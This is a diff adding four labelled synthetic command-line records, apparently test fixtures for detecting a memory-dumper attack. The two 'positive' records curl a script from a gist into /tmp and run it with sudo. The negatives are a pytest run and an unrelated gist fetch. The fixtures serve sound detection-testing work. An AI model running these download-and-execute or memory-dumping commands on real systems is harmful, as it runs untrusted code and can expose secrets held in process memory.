@@ -1,0 +1,4 @@
+{"label": "positive", "note": "synthetic: payload runs the memory dumper", "CommandLine": "sudo python3 memdump.py", "Image": "/usr/bin/python3"}
+{"label": "positive", "note": "synthetic: payload download step", "CommandLine": "curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py -o /tmp/x.py", "Image": "/usr/bin/curl"}
+{"label": "negative", "note": "synthetic: normal test run", "CommandLine": "python3 -m pytest -q", "Image": "/usr/bin/python3"}
+{"label": "negative", "note": "synthetic: unrelated gist", "CommandLine": "curl -sSf https://gist.githubusercontent.com/someone/abc/raw/a.sh", "Image": "/usr/bin/curl"}
